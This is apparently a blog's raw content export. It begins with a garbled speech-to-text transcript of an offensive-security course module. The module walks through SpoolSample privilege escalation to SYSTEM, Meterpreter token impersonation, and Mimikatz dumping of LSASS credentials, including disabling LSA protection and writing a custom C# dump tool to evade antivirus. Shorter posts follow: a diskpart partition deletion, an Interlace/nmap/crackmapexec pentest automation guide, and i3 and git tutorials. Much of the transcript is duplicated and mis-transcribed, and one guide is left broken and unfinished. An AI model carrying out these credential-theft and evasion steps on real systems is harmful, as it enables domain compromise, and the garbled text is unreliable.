01\n will execute this just as before by first a launching or application in the context of the network service to create the pipe server on app serves 01\n next will launch spool sample with the capture server set to app serves 01 pipe test which will force the system account to connect to our names pipe and a new command prompt is opened\n next will launch spool sample with the capture server set to app serves 01 height test which will force the system account to connect to our names pipe and a new command prompt is opened\n when we interact with it and display the user we find it to be system\n with this attack we can Elevate our privileges from a nun privileged account that has se impersonate privilege to system on any modern window System including Windows 2019 and the newest versions of Windows 10 nice\n with this attack we can Elevate our privileges from a nun privileged account that has se impersonate privilege II system on any modern window System including Windows 2019 and the newest versions of Windows 10 nice\n most native and third-party services that do not require administrative permissions run as network service or local service partly due to Microsoft's recommendation this attack technique means that compromising and unprivileged service is just as valuable as a system service\n in the next section will demonstrate how to impersonate tokens from other authenticated users instead of Simply advancing straight to system\nfun with incognito\n in this section will use the matter printer Incognito module to impersonate any logged-in users and obtain code execution in their contacts without access to any passwords for hashes although we'll use Mimi cats to collect Kerberos authentication credentials later in this module this access token attack Vector does not rely on Mimi cat and may evade some detection software\n to demonstrate this will authenticate to app serves 01 as the admin user through remote desktop\n and leave The Connection open\n will then switch to a system Integrity meterpreter shell next will load the Incognito extension through the load command\n will then switch to a system Integrity meterpreter shell next will do the Incognito extension through the load command\n and run help to display available commands\n will focus on list tokens - you which will list all currently used tokens by unique username\n the output reveals a delegation token for the admin domain user next will run impersonate token to impersonate the admin user through the impersonate logged on user API to invoke it we must specify the username of the token we want to impersonate\n the output shows that we were able to impersonate the admin domain user from a delegation token which will allow us to perform actions on this server and authenticate against remote computers in the context of that user\n with this approach we have impersonated a user within a mature Porter shell without writing to disk\nKerberos and domain credentials\n in an active directory implementation Kerberos handles most user and Integrated Service authentication in the following sections will explore how the Kerberos protocol is implemented in Windows and how we can leverage it for credential stealing\nKerberos Authentication\n the Microsoft implementation of the Kerberos Authentication Protocol was adopted from the Kerberos version 5 Authentication Protocol developed by MIT and has been Microsoft primary authentication mechanism since Windows Server 2003 while ntlm authentication Works through a principle of Challenge and response windows-based Kerberos authentication uses a ticket system at a high-level Kerberos client authentication to a service in active directory involves the use of a domain controller in the role of a key distribution center or KDC\n let's review this process in detail in order to lay a foundation for discussion in the following section when the user logs in a request is sent to the domain controller or DC\n this DC serves as a k DC and runs the authentication server service the initial authentication server request contains a timestamp encrypted using a hash derived from the current user username and password when the service receives the request it looks up the password hash associated with that user and attempts to decrypt the timestamp if the decryption process is successful and the timestamp is not a duplicate the authentication is considered successful the service replies to the client with an authentication server reply which contains a session key since her berosus stateless and a ticket granting ticket or TGT\n this DC serves as a k DC and runs the authentication server service the initial authentication server request contains a timestamp encrypted using a hash derived from the current user username and password when the service received the request it looks up the password hash associated with that user and attempts to decrypt the timestamp if the decryption process is successful and the timestamp is not a duplicate the authentication is considered successful the service replies to the client with an authentication server reply which contains a session key since her borrosas stateless and a ticket granting ticket or TGT\n the session key is encrypted using the user's password hash which the client could decrypt and reuse the TGT contains user information including memberships the domain a timestamp the IP address of the client and the second key in order to avoid tampering the ticket granting ticket is encrypted by a secret key known only to the ktc and cannot be decrypted by the client once the client has received the session key and the TGT the ktc considers the client authentication complete by default the TGT will be valid for 10 hours during this time the user is not required to retype the password additionally the TGT can be renewed without entering the password when the user attempt to access domain resources such as a network share exchange mailbox or some other application with a registered service\n the second key is encrypted using the user's password hash which the client could decrypt and reuse the TGT contains user information including memberships the domain a timestamp the IP address of the client and the session key in order to avoid tampering the ticket granting ticket is encrypted by a secret key known only to the ktc and cannot be decrypted by the client once the client has received the session key and the TGT the ktc considers the client authentication complete by default the TGT will be valid for 10 hours during this time the user is not required to retype the password additionally the TGT can be renewed without entering the password when the user attempts to access domain resources such as a network share exchange mailbox or some other application with a registered service\n people named or SPN the ktc is again contacted this time the client constructs a ticket granting service request packet that consists of the current user and a timestamp encrypted using the second key the ESPN of the resource and the encrypted TGT\n possible name or SPN the ktc is again contacted this time the client constructs a ticket granting service request packet that consists of the current user and a timestamp encrypted using the second key the ESPN of the resource and the encrypted TGT\n next the ticket granting service on the ktc receives the ticket granting service request and if the ESPN exist in the domain the TGT is decrypted using the secret key known only to the Katy see the session key is that extracted from the decrypted TGT and this key is used to decrypt the username and time stamp of the request if the TGT has a valid timestamp where no replay is detected and the request is not expired the TGT and session key usernames match and the origin and TT IP addresses match the request is accepted if this succeeds the ticket granting service response to the client with a ticket granting server reply\n next the ticket granting service on the ktc receives the ticket granting service request and if the ESPN exist in the domain the TGT is decrypted using the secret key known only to the Katy see the session key is an extracted from the decrypted TGT and this key is used to decrypt the username and time stamp of the request if the TGT has a valid timestamp where no replays detected and the request is not expired the TGT and session key usernames match and the origin and TT IP addresses match the request is accepted if this succeeds the ticket granting service response to the client with a ticket granting server reply\n this packet contains three parts the ESPN to which access has been granted a session key to be used between the client and the ESPN and a service ticket containing the username and memberships along with the newly-created session key\n the first two parts the SPN in the session key are encrypted using the session key associated with the creation of the TGT and the service ticket is encrypted using the password hash of the service account registered with the target SPN once the authentication process with the ktc is complete and the client as both a session key and a service ticket service authentication begins first of the client sends an application request which includes the username and a timestamp encrypted with the session key associated with the service ticket along with the service ticket itself\n the first two parts the SPN in the session key are encrypted using the session key associated with the creation of the TGT and the service ticket is encrypted using the password hash of the service account registered with the target SPN once the authentication process with a k t c is complete and the client as both a session key and a service ticket service authentication begins 1st to the client sends an application request which includes the username and a timestamp encrypted with the session key associated with the service ticket along with this service ticket itself\n the service decrypts the service ticket using its own password hash extracts the session key from it and the Crips the supplied username if the usernames match the request is accepted before access is granted the service inspects the Supply Group memberships in the service ticket and the signs appropriate permissions to the user after which the user may make use of the service as required\n this protocol may seem complicated and perhaps even convoluted but it was designed to mitigate various Network attacks and prevent the use of fake credentials\n now that we've explored the foundations of Kerberos authentication let's look at how we can dump cached credentials with Mimi cats\nmeaning cats\n in this section will discuss how many cats can be used to extract credentials from memory due to cashing requirements of the Kerberos protocol will also discuss local security Authority protection and how it can be bypassed due to the automatic renewal of tgt's password hashes are cashed in the local security Authority subsystem service or else ass memory space\n if we gain access to these houses we could crack them to obtain the clear text password or reuse them to perform various actions which will discuss in a later module since Alsace is part of the operating system and runs as system we need system or local administrator permission to gain access to the hashes stored on a Target in addition to data structures are not publicly documented and they are encrypted with an elsass stored key Mimi cats is a powerful tool that we can use to extract and manipulate credentials tokens and privileges in Windows in this section will specifically use it to dump cash domain credentials and use it for other purposes later in this module\n after launching Mimi cats from an elevated command prompt on a Windows 10 victim machine will have to tamper with the memory of the elsass process which is normally not allowed since it belongs to the system user and not the current offsec user however as administrator the offsec user can use SE debug privilege to read and modify a process under the ownership of a different user\n did you this will use the mini cats privilege debug command to enable the SE debug privilege by calling adjust token privileges\n once we have enabled the SE debug privilege will dump all cashed passwords and hatches from else asked with Secor LS a log on passwords\n the inner workings of the commander quite complex and Beyond the scope of this module due to the inherent encryption and undocumented structures employed by elsass but the results show the ntlm hash of the opsec domain user\n since 2012 when we make hats was released and cash credential dumping was popularized Microsoft has developed mitigation techniques LS a protection and Windows Defender credential guard in this module will focus on LS a protection as previously mentioned Windows divides its processes into four distinct Integrity levels an additional mitigation level protected processes light PPL was introduced from Windows 8 on Words which can be layered on top of the current Integrity level\n in essence this means that a process running at system Integrity cannot access or modify the memory space of a process executing at system Integrity with PPL enabled\n to demonstrate this will log into the windows 2019 server app serves 01 as the admin user\n this is done through the run as ppld word value in hkey local machine system current control set control LS a with a value of 1\n this is done through the run as ppld word value in hkey local machine system current control set control LSA with a value of 1\n this protection mechanism is disabled by default due to third-party compatibility issues on absurd 01 LS a protection has already been configured\n this protection mechanism is disabled by default due to third-party compatibility issues on app serves 01 LS a protection has already been configured\n when elsass is executing as a protected process light Mimi cats failed due to insufficient permissions\n the sicurella say log on passwords command Returns the access denied error value PPL protection is controlled by a bit residing in the eprocess kernel object associated with the target process\n if we could obtain code execution in Colonel space we could disable the LSA protection and dump the credentials luckily this can be achieved with Mimi cats since it comes bundled with the me me Dr. Sis driver we must be local administrator or system to dump the credentials which means we will also have the SE load driver privilege and the ability to load any signed drivers many cats can load the me me Dr. Sis driver with the bang plus command\n if we could obtain code execution in Colonel space we could disable the LSA protection and dump the credentials luckily this can be achieved with Mimi cats since it comes bundled with a Mimi Dr. Sisques driver we must be local administrator or system to dump the credentials which means we will also have the SE load driver privilege and the ability to load any signed drivers many cats can load the me me Dr. Sis driver with the bang plus command\n once the driver is loaded we can use it to disable to PPL protection for elsass through the process protect command while supplying the / process option to specify the name of the process\n and the remove flag to disable PPL\n while this technique will disable dlsa protection it does require that we upload the Mimi Dr. Sis driver to the victim machine which may trigger antivirus will again attempt to dump a cached credentials\n while this technique will disable the ls a protection it does require that we upload the Mimi Dr. Sis driver to the victim machine which may trigger antivirus next will again attempt to dump a cached credentials\n according to the South put we have by pasteles a protection and have obtained the admin domain users ntlm hash\n in the next section will discuss how to dump Alsace memory without Mimi cats\nprocessing credentials offline\n in this section will process the credentials offline by dumping the required memory section from the targets elsass and uploading it to a different Windows machine where we can safely extract the credentials this will help avoid detection since Mimi cats will neither be uploaded to nor run from the target machine\nmemory dump\n first we'll dump the process memory of elsass Windows allows us to create a dump file which is a snapshot of a given process this dump includes loaded libraries and application memory in this example will create the dump file with task manager to open task manager will right-click the taskbar and select it\n first we'll dump the process memory of Alsace Windows allows us to create a dump file which is a snapshot of a given process this dump includes loaded libraries and application memory in this example will create the dump file with task manager to open task manager will right-click the taskbar and select it\n next will navigate to the details Tab and locate the elsass. Exe process\n right-click it and choose create dump file\n after dumping the process memory the location of the dump file is presented in a pop-up\n what's the dump file is created we can copy it from the target to our local Windows client where we can parse it with Mimi cats in this example will stimulate offline parsing by copying the dump file to the Mimi cat's folder of the Windows 10 victim p.m. and will process it with Mimi cats there\n what's the dump file is created we can copy it from the target to our local Windows client where we can parse it with me me cats in this example will stimulate offline parsing by copying the dump file to the Mimi Katz folder of the Windows 10 victim p.m. and will process it with Mimi cats there\n first we'll run secure LS a mini dump supplying the name of the dump file to parse\n followed by sicurella say log on passwords to dump cached credentials\n this successfully dumps the admin domain users credentials and does not require Mimi cats on the target machine\n there is however one obvious disadvantage to this technique task manager cannot be run as a command line tool so we'll need gooey access to the Target alternatively we can create the dump file from the command line with crock dump from sysinternals\n since Proctor may also have a signature that could be recognized in the next section will build our own code to create the dump file\nmini dump right dump\n in this section will develop our own C sharp application to execute of memory dump that we can parse with Mimi cats when task manager and Prok dump create a dump file they are invoking the win32 mini dump right dump API this means that we can write our own application in C sharp that does the same thing\n begin will go over the function prototype this function requires a lot of arguments but only the first four are needed for our use case the first two arguments must be a handle to Alsace and the process ID of elsass respectively the third argument is a handle to the file that will contain the generated memory dump and the fourth is an enumeration type which will set to mini dump with full memory or its numerical value of 2 to obtain a full memory dump\n with the foundational understanding of the API in place will create a visual Studio C sharp console app on the Windows 10 client called mini dump\n select release build\n and set the CPU architecture to 64-bit\n next we'll add the P invoke translated dllimport statement for mini dump right dump\n before we can call mini dump right dump we have to set up the four required arguments first will obtain the process ID of elsass and open a handle to it\n you get the process ID we can use the get processes by name method of the process class supplying the process named as a string and select the ID property we must include the system Diagnostics namespace to make use of the process class\n you got the process ID we can use the get processes by name method of the process class supplying the process named as a string and select the ID property we must include the system Diagnostics namespace to make use of the process class\n we can obtain a handle to the Alsace process with the win32 open process API just as we would with process injection will include the dllimport statement for open process and Supply the arguments for full access no inheritance and the process ID of elsass\n now that we have the first two arguments and place we must set up the dump file instead of using the win32 createfile API we can take advantage of the filestream class along with its Constructor\n do instantiate the file stream object we must Supply to arguments the name and full path of the file and the file mode create option indicating that we want to create a new file will also include the system IO namespace to use the file stream class\n now that we have all the pieces in place we can invoke a mini dump right file\n when supplying the file handle argument to mini dump right dump we must convert it to a c style file handle through the dangerous get handle method of the safe file handle class after compiling the project\n we can execute it from an elevated command prompt and generate a dump file\n with a dump file created we can run Mimi cats to parse it as we did in the last example\n the output reveals that are custom c-sharp application did in fact create a valid dump file for Alsace by stepping away from pre develop tools we have improved our trade craft and likely avoided antivirus detection\nwrapping up\n in this module we discuss the various authentication mechanisms and privilege levels implemented in Windows and demonstrated various techniques and tools to obtain credentials and escalate our privileges"},{"fields":{"slug":"/deleting-the-recovery-partition"},"excerpt":null,"frontmatter":{"date":"17th June 2021 ","title":"Deleting the Recovery Partition","description":"Ever expanded the size of a disk to find a recovery partition taking up some of your continuous space?","tags":"windows, diskpart, admin, diskmngr","posttype":"tutorial"},"body":"Ever expanded the size of a disk to find a recovery partition taking up some of your continuous space?\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/ccf2a991-55e3-4555-8b2d-19bc63b297fb.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\"Recovery Partition in Our Continuos Space.\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Recovery Partition in Our Continuos Space.</figcaption>\n</figure>\n\n<h5 class=\"step\">Step 1 - Open diskpart.exe</h5>\n\nOpen up a CMD and type in diskpart. The software will open up an interactive console. \n\n<h5 class=\"step\">Step 2 - Listing Disks</h5>\n\n```\nLIST DISK\n```\n\n<h5 class=\"step\">Step 3 - Select A Disk</h5>\n\n```\nSELECT DISK 0\n```\n\n<h5 class=\"step\">Step 4 - Listing Disks</h5>\n\n```\nLIST PARTITION\n```\n\n<h5 class=\"step\">Step 5 - Select Partition</h5>\n\n```\nSELECT PARITION 4\n```\n\n<h5 class=\"step\">Step 5 - Deleting Partitions</h5>\n\n```\nDELETE PARTITION OVERRIDE\n```"},{"fields":{"slug":"/automation-for-pentesters-series-part-1-interlace"},"excerpt":null,"frontmatter":{"date":"11th June 2021 ","title":"Automation For Pentesters Series -  Part 1 Interlace","description":"","tags":"automation","posttype":"tutorial"},"body":"# Introduction \n\n## Instalation\n\n<h5 class=\"step\"> Step one, we clone the package from Github</h5>\n```\nsudo git clone https://github.com/codingo/Interlace.git /opt/Interlace\n```\n\n<h5 class=\"step\"> Step two, enter the directory and setup virtual environment</h5> \n\nThis step is optional but if you do not follow then you will install all the python packages globally which may or may not be a good thing depending on setup. \n\nWe use the `cd` command to change the directory and the `virtualenv` command \n```\ncd /opt/Interlace\nvirtualenv venv\nsource venv/bin/activate\n```\n\n<h5 class=\"step\"> Step three, we install the program</h5>\n\nFirst the Pip packages\n```\npip3 install -r requirements.txt\n```\n\nThen install via the setup.py\n``` \nsudo python3.9 setup.py install\n```\n\n> This took a few minutes for me so maybe now is the time for that coffee.\n\nIf you install interlace in a virtual environment then you will need to activate that environment before you use it\n```\nsource /opt/Interlace/venv/bin/activate\ninterlace -h\n```\n\n## Scanning \n\nIn the following examples, we will be looking at scans against one IP and multiple IP lists to compare. \n\nI have completed a discovery scan and I have the following IP addresses \n```\ncat nmap-discovery.gnmap | grep 'Status: Up' | cut -d \" \" -f 2 | tee targets.txt\n10.10.10.4\n10.10.10.43\n10.10.10.63\n10.10.10.68\n10.10.10.134\n10.10.10.229\n10.10.10.239\n10.10.10.245\n```\n\nI will put them in a file called `targets.txt` while we look at the syntax. Interlace allows us to run commands with things like thread taken care of. It allows variable substitution to keep scans looking uniform and handles some advanced functionality we would have to code ourselves. \n\n### Blockers vs Blocks\n\nThere are several key concepts you need to understand in order to benefit from the Interlace tool. \n\n**Blockers** \n\nA blocker prevents execution of commands following until all commands proceeding it has been completed. We can declare a blocker as follows\n```\n_blocker_\n```\n\n**Blocks**\n\nBlocks can be used to run commands that you would like to run in sequence, for example creating a folder before attempting to store the input in it. Interlace tries hard to run as much in parallel as possible and keep your system resources fully balanced however some things just need to be run in a strict order!\n\nWe can declare a block as follows\n```\n_block:something_\nmkdir _output_\nnmap _target_ -oA _output_/nmap-default\n_block:something_\n```\n\n**Command Queue is Intelligent**\n\nThis is important! One of the key uses of Interlace is that you use it to run commands from a file. The commands are looped over for each of the targets and items you might want to provide as command-line flags or positional values are passed available to each command in the form of strings that are replaced on each iteration `_target_`, `_port_` and `_output_` for a few examples. See below for the full table. \n\nIf however you put a line down that does not include any variables that need swapping out then Interlace will only run that command once. \n\nWithout going into the technical aspects of running commands at the moment, if we ran the following two commands as part of a command file against a 10.10.10.0/29 Cidr range then we would only get one DNS packet sent to Google and eight sent to the 10.10.10.0/29\n```\nping -c 1 8.8.8.8\nping -c 1 _target_\n```\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n    <img src=\"/static/e308540e-2b88-47a4-9a28-9dcfd2d65cce.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \">\n    <figcaption class=\"figure-caption text-center fw-normal text-dark\">  </figcaption>\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\"><img src=\"174d2199-c153-4b0a-ab21-15d6bf4b8a69.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"><figcaption class=\"figure-caption text-center fw-normal text-dark\">  </figcaption></figure></figure>\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n    <img src=\"/static/77696a18-7c23-494e-8c2c-525eef93dbfa.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \"> \n    <figcaption class=\"figure-caption text-center fw-normal text-dark\">  </figcaption>\n</figure>\n\nThis is ideal as we wouldn't want to ping google DNS every time we ping a new host. \n\n## Running Commands\n\nWe have two main ways of running commands. Either from a file or directly from the command line. \n\n### From The Command Line\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n    <img src=\"/static/93d185a7-f903-4b7e-a793-0a6bffae3cd4.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\"Running Commands Direct From Terminal.\">\n    <figcaption class=\"figure-caption text-center fw-normal text-dark\">Running Commands Direct From Terminal.</figcaption>\n</figure>\n\nJust to reinforce last point! When I do not use a replaceable target string the command runs just once.\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n    <img src=\"/static/7cabc5e0-e016-48d5-9f94-759c7f63aa35.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\"Command Runs Once Without Replaceable String.\">\n    <figcaption class=\"figure-caption text-center fw-normal text-dark\">Command Runs Once Without Replaceable String</figcaption>\n</figure>\n\nLastly, note if I give the command two ports but no `_target_` then it will run once for each port. \n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n    <img src=\"/static/93e7008a-650f-4406-997d-e0446cfb3d6e.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\"Adding Extra Ports Increases Command Variations.\">\n    <figcaption class=\"figure-caption text-center fw-normal text-dark\">Adding Extra Ports Increases Command Variations.</figcaption></figure>\n\n### From a File\n\nWhen we create our scans from files we have more control and access to a few more features. \n\nLet us have a quick look at some of the variable replacement we have access to. \n\n| Variable  | Replacement                                                             |\n|-----------|-------------------------------------------------------------------------|\n| \\_target\\_  | Replaced with the expanded target list that the current thread is running against  |\n| \\_cleantarget\\_  | Replaced with target cleanded from http:// or https://  |\n| \\_host\\_ | Works the same as \\_target\\_, and can be used interchangeably |\n| \\_output\\_   | Replaced with the output folder variable from Interlace              |\n| \\_port\\_     | Replaced with the expanded port variable from Interlace                       |\n| \\_realport\\_ | Replaced with the real port variable from Interlace                  |\n| \\_proxy\\_    | Replaced with the proxy list from Interlace |\n| \\_random\\_   | Replaced with the randomly chosen file from Interlace | \n\nAs we pass options to Interlace they become available to us in our scans. \n\nFor example, if we start a scan off like this\n```\ninterlace -t 10.10.10.0/24 -p 80 -o ./bug_bounty -cL commands.il\n```\n\nWe would have access to `_target_`, `_port_` and `_output_` variables within our Interlace command files (`-cL` is for providing Interlace with a list of commands). We might make a file such as\n```\n_block:nikto_\nmkdir -p _output_/_target_/nikto/\nnikto -host _target_ -port _port_ -output _output_/nikto/nikto-_target_-_port_.htm\n_block:nikto_\n```\n\nWe put the commands in a block to ensure they run sequentially in their thread. We do not want Nikto trying to save to an output directory that does not exist. \n\nWhile Interlace can look impressive at first we can avoid some of the screen clutter by adding the following options `--no-bar` and `--silent`.\n```\ninterlace -t 10.10.10.0/24 -p 80 -o ./bug_bounty -cL commands.il --no-bar --silent\n```\n\nEpanding our example even further!\n\nOpen up burpsuite and echo the default proxy address into a proxy.txt file.\n```\nburpsuite\necho http://127.0.0.1:8080 > proxy.txt\n```\n\nAdd the proxy option to Nikto\n```\n_block:nikto_\nmkdir -p _output_/_target_/nikto/\nnikto -host _target_ -port _port_ -output _output_/nikto/nikto-_target_-_port_.htm -useproxy _proxy_\n_block:nikto_\n```\n\nNow as we scan our scans are caught by burpsuite.\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n    <img src=\"/static/08747b40-624a-4bfd-a67d-9935fe11e6c0.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\"Targets Being Proxied Via Burp.\">\n    <figcaption class=\"figure-caption text-center fw-normal text-dark\">Targets Being Proxied Via Burp.</figcaption>\n</figure>\n\n> One item we have not looked at yet is the `-threads` option. By default it is set to 10 but you can set it to what you want based on the performance of your machine. \n\n## Making a CTF Fuzzer\n\n<h5 class=\"step\"> Step one, Helper Function</h5>\n\n```\n#!/bin/bash\n\n\n\n\n\n\nLet us create a file as follows (There is a convention of calling interlace configurations as dot `il`)\n```\nnano test.il\n```\n\nInside the `test.il` file we will write the following\n```\nmkdir output && echo \"made\"\nping -c 2 _target_\n```\n\nNow we will run this on the command line \n```\ninterlace -t 10.10.10.0/29 -cL test.il --no-bar -threads 15 --silent\n```\n\n\n\n\n\nmkdir _target_ && echo \"Made Directory For _target\"\n_blocker_\n_block:ping_\nping -c 2 _target_\n_block:ping_\n_block:curl\n\n\n\n\n```\nnano staged_nmap.il\n```\nInside we will put the following\n```\nrm -rf _output_\nmkdir -p _output_/_target_/scans/\nmkdir -p _output_/_target_/scans/nmap\nmkdir -p _output_/_target_/scans/nmblookup\nmkdir -p _output_/_target_/scans/cme\nmkdir -p _output_/_target_/loot/\nmkdir -p _output_/_target_/downloads/\nmkdir -p _output_/_target_/shells/\n_blocker_\nnmap -sSV -vv --script banner -A --top-ports=20 _target_ -oA _output_/_target_/scans/nmap/nmap-_target_-quick-scan\n_blocker_\nnmap -T4 -sSV -vv -p-  --max-retries=2 _target_ -oA _output_/_target_/scans/nmap/nmap-_target_-full-65k-syn\nnmap -T4 -sUV -vv --top-ports=2000 --max-retries=1 _target_ -oA _output_/_target_/scans/nmap/nmap-_target_-top-2000-udp\n_blocker_\nnmblookup -A _target_ > _output_/_target_/scans/nmblookup/nmblookup-_target_.txt\ncrackmapexec smb _target_ > _output_/_target_/scans/crackmapexec/cme-_target_.txt\n```\n\nWe can now run our first command like so. \n```\ninterlace -tL ./targets.txt -threads 10 -cL staged_nmap.il -o /pentest/output\n```\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n    <img src=\"/static/eaa5ddee-a211-4930-bede-cee45ad9c816.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \">\n    <figcaption class=\"figure-caption text-center fw-normal text-dark\">  </figcaption>\n</figure>\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n    <img src=\"/static/5a89ffdd-d554-4feb-a9b7-c96fdc25cfb0.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\" \">\n    <figcaption class=\"figure-caption text-center fw-normal text-dark\">  </figcaption>\n</figure>\n\n\nVariable\tReplacement\n_target_\tReplaced with the expanded target list that the current thread is running against\n_cleantarget_\tReplaced with target cleanded from http:// or https://\n_host_\tWorks the same as _target_, and can be used interchangeably\n_output_\tReplaced with the output folder variable from Interlace\n_port_\tReplaced with the expanded port variable from Interlace\n_realport_\tReplaced with the real port variable from Interlace\n_proxy_\tReplaced with the proxy list from Interlace\n_random_\tReplaced with the randomly chosen file from Interlace"},{"fields":{"slug":"/getting-started-with-i3wm"},"excerpt":null,"frontmatter":{"date":"8th June 2021 ","title":"Getting Started With i3wm","description":"","tags":null,"posttype":"tutorial"},"body":"# Overview\n\nToday we will be looking at i3. A productivity tool.\n\n<h5 class=\"step\">Step 1: Install the software</h5>\n\nInstall the following packages. Note, adding `-y` will automatically confirm instal and you will not be prompted. \n```\nsudo apt install -y i3 i3-wm i3status rofi polybar \n```\n\n<h5 class=\"step\">Step 2: Sign-out and sign-in selecting the i3 Xsession.</h5>\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n    <img src=\"/static/7960e59e-6713-4b03-835a-0b9a261cfc1d.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\"Sign-out and Log back in with i3.\"> \n    <figcaption class=\"figure-caption text-center fw-normal text-dark\">Sign-out and Log back in with i3.</figcaption>\n</figure>\n\nWe are presented with a dialogue asking us if we would like a config generated. Press `Enter`. \n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n    <img src=\"/static/c713f525-d2c4-4593-9191-e783e0dd6d19.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\"First Configuration Prompt.\">\n    <figcaption class=\"figure-caption text-center fw-normal text-dark\">First Configuration Prompt.</figcaption>\n</figure>\n\nNext, we can confirm which we will use as the default modifier key. Press `Enter` to accept the `Win` key\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n    <img src=\"/static/403fb618-ebcf-4f1d-abd2-54f93c54cb54.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\"Choose Default Modifier and Write To File\">\n    <figcaption class=\"figure-caption text-center fw-normal text-dark\">Choose Default Modifier and Write To File</figcaption>\n</figure>\n\nHit `Win` + `Enter` to open up a terminal.\n\n<h5 class=\"step\">Step 3: Configure Polybar.</h5>\n\nMake a folder for the configuration file and copy the sample provided. \n```\nmkdir -p ~/.config/polybar/\ncp /usr/share/doc/polybar/config ~/config/polybar/\n```\n\nCreate a Polybar launcher script\n```\nnano ~/config/polybar/launcher.sh\n```\n\nContent of the launcher field should look similar to this \n```\n#!/usr/bin/env bash\n\n# Terminate already running bar instances\nkillall -q polybar\n# If all your bars have ipc enabled, you can also use \n# polybar-msg cmd quit\n\n# Launch saint custom toolbar\necho \"---\" | tee -a /tmp/saintbar.log\npolybar saint 2>&1 | tee -a /tmp/saintbar.log & disown\n\necho \"Bar launched...\"\n```\n\nMake it executable:\n```\nchmod +x $HOME/.config/polybar/launch.sh\n```\n\nEdit the i3 config file. Add the `launch.sh` script and comment out the default i3bar.\n```\nnano ~/.config/i3/config\n```\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n    <img src=\"/static/619b7283-5ca4-41e2-a5be-a8e4e541ede0.png\" class=\"figure-img img-fluid border border-1 border-dark\" alt=\"Launcher Added and Default Panel Commented Out\">\n    <figcaption class=\"figure-caption text-center fw-normal text-dark\">Launcher Added and Default Panel Commented Out</figcaption>\n</figure>\n\n<h5 class=\"step\">Step 4: Install Rofi Themes.</h5>\n\n```\ngit clone --depth=1 https://github.com/adi1090x/rofi.git ~/.config/rofi\ncd rofi\nchmod +x setup.sh\n./setup.sh\n```"},{"fields":{"slug":"/getting-to-grips-with-git"},"excerpt":"Creating a Git development branch You can list all of your current branches like this:\n\ngit branch -a\n\n\nThis shows all of the local and remote…","frontmatter":{"date":"13th May 2021 ","title":"Getting To Grips With GIT","description":"","tags":"git","posttype":"tutorial"},"body":"## Creating a Git development branch\n\nYou can list all of your current branches like this:\n```\ngit branch -a\n```\nThis shows all of the local and remote branches. Assuming you only have a single master branch, you'd see the following:\n```\n* master\n  remotes/origin/master\n```\n\nThe `*` means the current branch.\n\nTo create a new branch named development, use the following command:\n```\ngit checkout -b development\n```\n\nThe `-b` flag creates the branch. Listing the branches now should show:\n```\n* development\n  master\n  remotes/origin/master\n```\n\n## Changing branches\n\nIt would be best not to commit anything directly to the master branch. Instead, do all your work on the development branch and then merge your work into the master branch whenever you have a new public release.\n\nYou are already in your development branch, but if you weren't, the way to switch is as follows:\n```\ngit checkout development\n```\n\n> That's the same way you create a branch but without the `-b`.\n\n## Making changes on the development\n\nWhen making changes, add and commit as usual:\n```\ngit add .\ngit commit -m \"Use a useful comment to identify the commit.\"\n```\n\nThe first time you push to your remote, do it as follows:\n```\ngit push -u origin development\n```\nThe `-u` flag stands for `--set-upstream`.  After the first time, you only need to do it like this:\n```\ngit push\n```\n\n## Merging development to master\n\nOnce your developed code is ready to be merged into your master branch, you can do it like so:\n\nFirst switch to your local master branch:\n```\ngit checkout master\n```\n\nTo merge development into master, do the following:\n```\ngit merge development\n```\n\nThen push the changes in local master to the remote master:\n```\ngit push\n```\n\n## Deleting a branch\n\nIf you don't need the development branch anymore, or you want to delete it and start over, you can do the following:\n\nDelete the remote development branch:\n```\ngit push -d origin development\n```\n\nThen delete the local branch:\n```\ngit branch -d development\n```\n\nThe `-d` means delete."},{"fields":{"slug":"/amazon-relational-database-service-rds"},"excerpt":"","frontmatter":{"date":"7th May 2021 ","title":"Amazon Relational Database Service (RDS)","description":"","tags":null,"posttype":"article"},"body":""},{"fields":{"slug":"/disable-parrot-os-updater-on-kde"},"excerpt":null,"frontmatter":{"date":"28th April 2021 ","title":"Disable Parrot OS Updater On KDE","description":"","tags":"kde, parrot-os","posttype":"blog"},"body":"If you do not customise the installation of Parrot Os, then typically, upon booting of the operating system, you will see the Parrot OS Updater asking if you want to check for updates. \n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/116e1091-1f01-4e06-af9a-58563254636b.png\" class=\"img-fluid\" alt=\"Parrot OS Updater\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">Parrot OS Updater.</figcaption>\n</figure>\n\nWhile regular updating and patching of your machine are encouraged, this can sometimes be inconvenient. Especially if you have just booted your machine up inside a data centre or on a client site\n\n> N.B. It is never a good idea to update your Pentest Machine while on a client site or minutes before starting a job or pentest exam. \n\n## Turning Off the Parrot OS Updater\n\n> ***Now I should point out I am using 